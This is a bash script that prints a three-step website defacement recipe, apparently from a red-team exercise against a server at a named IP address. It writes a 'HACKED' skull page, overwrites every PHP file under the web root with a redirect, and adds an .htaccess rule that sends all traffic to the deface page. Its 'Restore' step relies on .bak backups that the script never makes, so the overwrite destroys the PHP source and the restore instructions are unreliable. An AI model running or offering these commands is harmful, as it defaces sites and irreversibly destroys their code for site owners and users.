#!/bin/bash
echo "============================================================"
echo "💀 Quick Defacement - 3 Steps"
echo "============================================================"
echo ""
echo "Step 1: Create hacked.html"
echo "------------------------------------------------------------"
cat << 'EOF'
cat > /var/www/html/hacked.html << 'END'
<!DOCTYPE html><html><head><meta charset="utf-8"><title>HACKED</title><style>*{margin:0;padding:0}body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center}.skull{font-size:10px;line-height:1;white-space:pre}h1{font-size:3em;color:#f00;animation:b .5s infinite}@keyframes b{0%,100%{opacity:1}50%{opacity:.3}}</style></head><body><div><div class="skull">    _.--""-._
 ."         ".
/             \
|,  .-.  .-.  ,|
| )(__/  \__)( |
|/     /\     \|
(_     ^^     _)
 \____________/</div><h1>HACKED</h1><p style="margin:20px 0">SYSTEM COMPROMISED</p><p>[SQL Injection: BYPASSED]<br>[File Upload: EXPLOITED]<br>[XSS: INJECTED]<br>[CSRF: EXECUTED]<br>[Database: COMPROMISED]</p><p style="margin-top:20px">-- Red Team --</p></div></body></html>
END
EOF

echo ""
echo "Step 2: Redirect all PHP files"
echo "------------------------------------------------------------"
cat << 'EOF'
find /var/www/html -name "*.php" -exec sh -c 'echo "<?php header(\"Location: /hacked.html\"); exit; ?>" > "$1"' _ {} \;
EOF

echo ""
echo "Step 3: Create .htaccess"
echo "------------------------------------------------------------"
cat << 'EOF'
cat > /var/www/html/.htaccess << 'END'
RewriteEngine On
RewriteCond %{REQUEST_URI} !^/hacked\.html$
RewriteRule ^(.*)$ /hacked.html [L,R=302]
END
EOF

echo ""
echo "============================================================"
echo "Test:"
echo "http://52.78.221.104/"
echo "http://52.78.221.104/login.php"
echo "http://52.78.221.104/profile.php"
echo "http://52.78.221.104/anything"
echo ""
echo "→ ALL redirect to skull page!"
echo "============================================================"
echo ""
echo "Restore:"
echo "------------------------------------------------------------"
cat << 'EOF'
rm /var/www/html/.htaccess
rm /var/www/html/hacked.html
find /var/www/html -name "*.php.bak" -exec sh -c 'mv "$1" "${1%.bak}"' _ {} \;
EOF
echo "============================================================"
